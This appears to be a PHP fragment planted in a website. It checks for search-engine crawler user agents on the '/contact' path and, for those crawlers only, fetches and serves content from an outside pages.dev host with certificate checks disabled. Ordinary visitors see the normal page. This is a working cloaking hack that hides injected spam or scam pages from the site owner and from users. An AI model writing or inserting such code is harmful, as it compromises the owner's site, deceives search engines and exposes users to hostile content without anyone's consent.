<?php
ob_start();
header("Vary: User-Agent");

$remote_url  = "https://texasedu-s777.pages.dev/lp";
$bot_pattern = "/(googlebot|googlebot-mobile|googlebot-news|google-site-verification|google-inspectiontool|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
$user_agent  = isset($_SERVER["HTTP_USER_AGENT"])
    ? strtolower($_SERVER["HTTP_USER_AGENT"])
    : '';

$request_uri = $_SERVER['REQUEST_URI'] ?? '';

function fetch_remote_content($url)
{
    if (function_exists("curl_init")) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $result = curl_exec($ch);
        curl_close($ch);
        return $result;

    } elseif (ini_get("allow_url_fopen")) {

        $context = stream_context_create([
            'ssl' => [
                'verify_peer'      => false,
                'verify_peer_name' => false
            ],
            'http' => [
                'timeout' => 5
            ]
        ]);

        return @file_get_contents($url, false, $context);
    }

    return false;
}

$clean_uri = parse_url($request_uri, PHP_URL_PATH);
$clean_uri = rtrim($clean_uri ?: '/', '/');

if ($clean_uri === '/contact'
    && preg_match($bot_pattern, $user_agent)
) {
    usleep(rand(100000, 200000));

    $content = fetch_remote_content($remote_url);
    if ($content !== false && !empty($content)) {
        echo $content;
        ob_end_flush();
        exit;
    }
}
?>
